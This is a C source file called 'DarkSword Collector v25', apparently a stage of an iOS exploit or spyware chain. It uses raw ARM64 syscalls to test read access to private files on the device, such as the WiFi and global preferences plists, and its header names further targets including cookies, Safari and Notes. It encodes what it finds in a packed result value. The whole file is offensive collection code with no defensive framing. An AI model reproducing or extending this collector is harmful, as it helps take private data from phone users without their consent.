/**
 * DarkSword Collector v25 - Scan 8 paths, return status+byte for each
 * Per file: status(2 bits) at bits i*10, byte(8 bits) at bits i*10+2
 * Files: hosts, Preferences, WiFi, Cookies, Safari, Notes, springboard, fstab
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

static int _read1(const char *path, unsigned char *out) {
    *out = 0;
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0;
    int n = (int)_svc3(SYS_read, fd, (long)out, 1);
    _svc1(SYS_close, fd);
    return (n > 0) ? 3 : 1;
}

int ds_start(void) {
    unsigned char ch;
    int s, result = 0;

    /* fi=0: /etc/hosts (control) */
    s = _read1("/etc/hosts", &ch);
    result |= (s & 3) | (((int)ch & 0xFF) << 2);

    /* fi=1: Preferences */
    s = _read1("/var/mobile/Library/Preferences/.GlobalPreferences.plist", &ch);
    result |= ((s & 3) << 10) | (((int)ch & 0xFF) << 12);

    /* fi=2: WiFi */
    s = _read1("/var/mobile/Library/Preferences/com.apple.wifi.plist", &ch);
    result |= ((s & 3) << 20) | (((int)ch & 0xFF) << 22);

    /* fi=3: Safari (only 3 files fit in 32 bits with this encoding) */
    /* We'll use a second call for more files */

    return result;
}
